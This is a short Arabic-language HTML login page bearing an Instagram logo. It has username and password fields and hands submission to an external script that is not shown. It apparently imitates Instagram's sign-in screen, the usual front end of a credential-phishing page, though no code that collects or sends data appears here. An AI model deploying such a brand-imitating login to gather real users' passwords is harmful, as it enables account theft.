<!doctype html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <div class="login-form">
            <img src="logo.png" alt="Instagram Logo" class="logo">
            <form id="loginForm" onsubmit="return handleLogin()">
                <div class="input-group">
                    <input type="text" placeholder="رقم الهاتف، اسم المستخدم، أو البريد الإلكتروني" required>
                </div>
                <div class="input-group">
                    <input type="password" placeholder="كلمة السر" required>
                </div>
                <button type="submit" class="login-button">تسجيل الدخول</button>
            </form>
        </div>
    </div>
    <script src="script.js"></script>

</body></html>
